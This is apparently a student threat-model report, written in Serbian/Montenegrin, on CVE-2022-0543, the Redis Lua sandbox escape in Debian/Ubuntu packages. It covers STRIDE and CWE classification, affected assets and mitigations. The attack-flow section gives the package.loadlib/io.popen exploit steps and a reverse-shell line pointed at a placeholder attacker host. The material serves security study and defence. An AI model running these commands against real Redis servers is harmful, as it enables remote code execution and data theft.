# CVE-2022-0543 — Redis Lua Sandbox Escape (Remote Code Execution)

###### Danilo Cvijetić R225/2025

---

## 1. Uvod

Redis ugrađuje Lua interpreter (verzija 5.1) kako bi omogućio atomsko izvršavanje skripti na serveru putem `EVAL` i `EVALSHA` komandi. Ovaj mehanizam je dizajniran da bude izolovan tako što Redis Lua sandbox blokira pristup opasnim modulima poput `io`, `os` i `package`, ostavljajući dostupnima samo sigurne funkcije.

**CVE-2022-0543** otkriva da Debian i Ubuntu maintaineri, pri pakovanju Redis-a kao sistemskog paketa (`redis-server` putem `apt`), kompajliraju Lua interpreter kao dinamički link prema sistemskoj `liblua` biblioteci. Ova varijanta Lua-e uključuje globalni `package` modul koji **nije prisutan u upstream Redis buildu**. Redis sandbox ne blokira `package` jer na njega ne računa što rezultuje da napadač može kroz `package.loadlib()` učitati libc i pozvati `io.popen()`, čime dobija potpuni RCE na Redis hostu.

Ranjivost je posebno relevantna za Ordering podsistem jer **mitigirani owner-aware Redis lock (Napad 1) koristi upravo `EVALSHA` Lua skriptu** za atomski release. Isti mehanizam koji štiti od Race Condition postaje napadni vektor ako je Redis deployovan kao Debian/Ubuntu paket.

**Ranjive verzije**:

| Distribucija | Ranjivi paket | Patchovani paket |
|---|---|---|
| Debian 10 (Buster) | `redis-server 5:5.0.14-1+deb10u3` i stariji | `5:5.0.14-1+deb10u4` |
| Debian 11 (Bullseye) | `redis-server 5:6.0.16-1+deb11u1` i stariji | `5:6.0.16-1+deb11u2` |
| Ubuntu 20.04 (Focal) | `redis-server 5:5.0.7-2ubuntu0.1` i stariji | `5:5.0.7-2ubuntu0.1+esm1` |
| Ubuntu 22.04 (Jammy) | Paket iz tog perioda | nadogradnjom riješeno |

---

## 2. Definicija pretnje

### 2.1 STRIDE klasifikacija

| STRIDE kategorija | Primjenljivost | Obrazloženje |
|---|---|---|
| **Spoofing** | Ne | Napad ne zahtijeva lažno predstavljanje identiteta. |
| **Tampering** | Da | Napadač može mijenjati sve Redis ključeve, uključujući lock vrijednosti i checkout sesije, ali i fajlove na hostu. |
| **Repudiation** | Da | OS komande pokrenute iz Lua skripte ne ostavljaju trag u Redis logovima — samo `EVAL` komanda je logovana, ne njen efekat na OS. |
| **Information Disclosure** | Da | Čitanje env varijabli, konfiguracionih fajlova i svih Redis ključeva na hostu. |
| **Denial of Service** | Da | Napadač može terminirati Redis proces ili obrisati kritične podatke. |
| **Elevation of Privilege** | Da | Napadač eskalira sa pristupa Redis portu (6379) na potpuni OS pristup serverskom hostu. |

### 2.2 CWE referenca

- **CWE-265** — Privilege Issues: Redis sandbox ne sprečava pristup `package` modulu koji nije trebao biti dostupan.
- **CWE-693** — Protection Mechanism Failure: mehanizam sandbox izolacije ne funkcioniše ispravno zbog razlike između upstream i Debian Lua builda.
- **CWE-94** — Improper Control of Generation of Code: napadač izvršava proizvoljni sistemski kod kroz `EVAL` mehanizam koji je dizajniran za sigurno izvršavanje skripti.

### 2.3 Opis pretnje

Upstream Redis, pri kompajliranju Lua interpretera, **statički linkuje** Lua biblioteku i **eksplicitno izostavlja** `package` modul iz globalnog namespace-a koji je dostupan skripta. Debian/Ubuntu maintaineri, iz razloga ponovne upotrebe sistemskih biblioteka i smanjenja veličine paketa, linkuju Redis **dinamički** prema sistemskoj `liblua5.1.so`. Ova varijanta Lua-e inicijalizuje `package` modul i ostavlja ga u globalnom namespace-u.

Rezultat: poziv `package.loadlib("/usr/lib/x86_64-linux-gnu/libc.so.6", "luaopen_io")` u Redis Lua skriti uspješno učitava libc i vraća `io` modul, koji nije blokiran sandbox-om. Kroz `io.popen()` napadač može pokrenuti proizvoljnu shell komandu i pročitati njen output.

---

## 3. Afektovani resursi

### 3.1 Redis podaci — INTEGRITET / POVJERLJIVOST / DOSTUPNOST

Napadač koji može izvršiti `EVAL` ima nativni pristup svim Redis ključevima. Kroz RCE dobija OS pristup Redis data direktorijumu i može:
- Čitati, mijenjati ili brisati sve ključeve (uključujući distribuirane lockove i checkout sesije)
- Terminirati Redis proces (`kill -9 $(pidof redis-server)`)
- Manipulisati lock vrijednostima kako bi ponovio Race Condition iz Napada 1

**CIA**: Sva tri aspekta kompromitovana.

### 3.2 Ordering distribuirani lock — INTEGRITET

Mitigirani owner-aware lock čuva UUID vrijednost u ključu `lock:{orderID}`. Napadač koji kompromituje Redis može:
- Direktno postaviti `SET lock:{orderID} attacker-uuid` i preuzeti lock za bilo koju porudžbinu
- Obrisati lock ključeve (`DEL lock:{orderID}`) i omogućiti paralelne state machine tranzicije
- Time reaktivira Race Condition koji je Napad 1 mitigacija trebala spriječiti

**CIA**: Integritet kompromitovan.

### 3.3 Server host — POVJERLJIVOST / INTEGRITET

Kroz `io.popen()` napadač dobija pristup cjelokupnom fajl sistemu Redis hosta, env varijablama i mrežnim resursima. U Docker mreži gdje Redis dijeli `ordering-net` sa Go servisom i Cassandrom, kompromitovanje Redis hosta omogućava lateralno kretanje.

**CIA**: Povjerljivost i integritet hosta kompromitovani.

### 3.4 Aplikacioni kredencijali — POVJERLJIVOST

Env varijable Go servisa (`WEBHOOK_SECRET`, `CASSANDRA_HOST`, `REDIS_ADDR`) mogu biti dostupne na Redis hostu ukoliko su servisi na istom hostu ili dijele isti Docker network namespace.

**CIA**: Povjerljivost kompromitovana.

---

## 4. Model napada

### 4.1 Akter napada

**Interni napadač ili napadač sa pristupom internoj mreži** — napadač koji može poslati komande Redis serveru. U praksi:
- Kompromitovani developer sa pristupom internoj mreži
- Napadač koji je prethodno eksploatisao drugu ranjivost u sistemu i pivotovao na internu mrežu
- Maliciozni zaposleni sa direktnim pristupom Redis CLI-ju ili infrastrukturnim alatima

Napadač **ne mora** poznavati Redis lozinku ako Redis nije konfigurisan sa `requirepass` direktivom (što je čest slučaj za interni Redis u Docker okruženjima).

### 4.2 Preduslovi

- Redis deployovan kao Debian ili Ubuntu sistemski paket (`apt-get install redis-server`) — **ne** zvanični upstream Docker image
- Redis dostupan na portu 6379 (bez firewall ograničenja sa napadačeve pozicije)
- Redis nema konfigurisan `requirepass` ili napadač posjeduje Redis lozinku

### 4.3 Tok napada

```
1. Napadač skenira mrežu, pronalazi Redis na portu 6379
   redis-cli -h <redis-host> ping
   → PONG

2. Provjerava da li je package modul dostupan (fingerprint ranjivosti)
   redis-cli -h <redis-host> EVAL "return type(package)" 0
   → "table"   ← ranjivo (package je dostupan)
   → ERR       ← nije ranjivo (package nije dostupan)

3. Ucitava io modul kroz package.loadlib()
   EVAL 'local f = package.loadlib(
     "/usr/lib/x86_64-linux-gnu/libc.so.6", "luaopen_io"
   ); local io = f(); ...' 0

4. Izvrsava OS komandu i cita output
   io.popen("id", "r"):read("*a")
   → "uid=999(redis) gid=999(redis) groups=999(redis)"

5. Instalira reverse shell ili eksfiltrira podatke
   io.popen("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
```

---

## 5. Mitigacija

### 5.1 Primarna mitigacija — koristiti upstream Redis, ne Debian paket

Najdirektnije rješenje: **ne koristiti `apt-get install redis-server`** na Debian/Ubuntu sistemima. Umjesto toga koristiti:

- **Zvanični Docker image**: `redis:7-alpine` ili `redis:7` (upstream build, nije zahvaćen)
- **Snap paket**: `snap install redis` (koristi upstream build)
- **Kompajliranje iz sourca**: sa [redis.io](https://redis.io/download/)

```yaml
# docker-compose.yml — sigurna konfiguracija (upstream image)
redis:
  image: redis:7-alpine   # upstream build, package modul nije ukljucen
  command: redis-server --requirepass ${REDIS_PASSWORD}
```

### 5.2 Onemogućavanje EVAL komandi (ako Lua nije potrebna)

Ako aplikacija ne koristi Lua skripte, `EVAL` i `EVALSHA` se mogu onemogućiti putem Redis ACL mehanizma:

```
# redis.conf
ACL SETUSER default -eval -evalsha -script
```

### 5.3 Autentifikacija i mrežna segmentacija

```
# redis.conf
requirepass "strong-random-password-here"
bind 127.0.0.1                 
protected-mode yes            
```

U Docker okruženju:
```yaml
# docker-compose.yml
redis:
  image: redis:7-alpine
  # ports:
  #   - "6379:6379"   # UKLONITI — dostupan samo unutar docker networka
  networks:
    - ordering-net
```

### 5.4 Redis ACL — least privilege

Čak i uz autentifikaciju, aplikacioni korisnik treba imati samo komande koje koristi:

```
# redis.conf
ACL SETUSER ordering-app on >app-password
  ~lock:*
  ~dedup:*
  +get +set +del +evalsha
  -eval
  -config
  -debug
  -acl
```

### 5.5 Sažetak mitigacionih mjera

| Mjera | Efikasnost | Napomena |
|---|---|---|
| Upstream Redis image/binary | Potpuna eliminacija CVE | Preporučeno kao primarna mjera |
| Nadogradnja Debian paketa | Eliminacija CVE | Ako se mora koristiti apt paket |
| Onemogućavanje EVAL/EVALSHA | Eliminiše vektor | Nije primjenljivo uz Lua lockove |
| `requirepass` + mrežna segmentacija | Ograničava pristup | Neophodan kao defense-in-depth |
| Redis ACL least privilege | Ograničava eksploataciju | Preporučeno uz sve ostalo |

---

## 8. Zaključak

CVE-2022-0543 je primjer ranjivosti koja nastaje zbog razlike u build procesu između upstream projekta i distribucijskog paketa, a ne zbog greške u Redis izvornom kodu. Upstream Redis nikada nije uključivao `package` modul u Lua sandbox; Debian/Ubuntu paket ga je nenamjerno uveo dinamičkim linkovanjem sistemske Lua biblioteke.

Ranjivost je kritična (CVSS 10.0) jer zahtijeva samo mrežni pristup Redis portu i jednu `EVAL` komandu za potpuni RCE.
